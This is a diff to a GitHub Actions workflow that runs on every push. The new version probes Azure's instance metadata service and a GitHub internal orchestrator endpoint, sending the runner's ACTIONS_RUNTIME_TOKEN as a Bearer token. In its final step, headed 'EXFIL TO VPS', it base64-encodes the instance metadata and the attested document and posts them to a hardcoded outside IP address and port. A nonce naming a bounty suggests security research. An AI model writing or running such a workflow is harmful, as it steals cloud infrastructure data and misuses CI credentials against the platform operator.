@@ -1,19 +1,40 @@
-name: IMDS Focused
+name: IMDS Orchestrator Probe
 on: [push]
 jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Focused IMDS probe
+      - name: Orchestrator and full IMDS
         run: |
-          echo "=== SCHEDULEDEVENTS ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" || echo BLOCKED
+          VPS="95.111.224.167"
+          PORT="8086"
+          echo "=== ORCHESTRATOR RESPONSE ==="
+          ORCH=$(curl -sf --max-time 8 -w "\nHTTP_STATUS:%{http_code}" \
+            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" 2>&1)
+          echo "$ORCH"
           echo ""
-          echo "=== ATTESTED DOCUMENT (Azure-signed) ==="
-          curl -sf -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01&nonce=1234567890" | python3 -c "import sys,json; d=json.load(sys.stdin); print(chr(10).join([f\"{k}: {str(v)[:200]}\" for k,v in d.items()]))" || echo BLOCKED
+          echo "=== ORCHESTRATOR WITH ACTIONS TOKEN ==="
+          ORCH2=$(curl -sf --max-time 8 -w "\nHTTP_STATUS:%{http_code}" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json" \
+            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" 2>&1)
+          echo "$ORCH2"
           echo ""
-          echo "=== INTERNAL ORCHESTRATOR ==="
-          curl -sf --max-time 5 "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" -v 2>&1 | head -30 || echo BLOCKED
+          echo "=== FULL IMDS TAGS DUMP ==="
+          curl -sf -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+            python3 -c "
+import sys,json
+d=json.load(sys.stdin)[\"compute\"]
+for k in [\"subscriptionId\",\"resourceGroupName\",\"vmId\",\"name\",\"vmSize\",\"location\",\"tags\"]:
+    print(f\"{k}: {d.get(k,\"N/A\")[:500]}\")
+"
           echo ""
-          echo "=== GITHUB_ACTIONS ENV VARS ==="
-          env | grep -E "^(GITHUB|RUNNER|ACTIONS)" | grep -v -iE "(token|secret|key)" | sort
+          echo "=== EXFIL TO VPS ==="
+          IMDS_DATA=$(curl -sf -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          ATTESTED=$(curl -sf -H "Metadata: true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01&nonce=ghbounty2026")
+          curl -sk "http://${VPS}:${PORT}/gh-ci-callback?t=IMDS_EXFIL&r=IMDS" \
+            -d "imds=$(echo $IMDS_DATA | base64 -w0 | head -c 2000)&att=$(echo $ATTESTED | base64 -w0 | head -c 1000)" 2>/dev/null
+          echo "Exfil sent to VPS"
